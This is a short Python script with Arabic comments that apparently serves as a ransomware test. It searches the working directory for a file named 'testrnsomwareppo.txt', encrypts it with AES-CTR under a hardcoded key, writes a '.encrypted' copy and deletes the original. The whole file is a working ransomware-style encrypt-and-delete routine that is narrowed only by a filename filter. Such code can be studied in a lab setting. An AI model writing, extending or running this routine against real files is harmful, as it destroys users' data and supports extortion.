import os
import platform
import pyaes

def encrypt_file(file_path, key):
    # قراءة البيانات من الملف
    with open(file_path, 'rb') as f:
        file_data = f.read()

    # تشفير البيانات
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)

    # كتابة البيانات المشفرة إلى ملف جديد
    new_file_path = file_path + ".encrypted"
    with open(new_file_path, 'wb') as f:
        f.write(encrypted_data)

    # حذف الملف الأصلي
    os.remove(file_path)
    print(f"File encrypted: {new_file_path}")


def find_and_encrypt_files(file_name, key):
    base_path = os.getcwd()  # استخدام مجلد المشروع فقط
    for root, dirs, files in os.walk(base_path):
        for file in files:
            if file == file_name:
                file_path = os.path.join(root, file)
                print(f"Encrypting file: {file_path}")
                encrypt_file(file_path, key)


# تحديد مفتاح التشفير (16 بايت)
encryption_key = b'Sixteen byte key'

# استدعاء دالة البحث والتشفير
find_and_encrypt_files('testrnsomwareppo.txt', encryption_key)
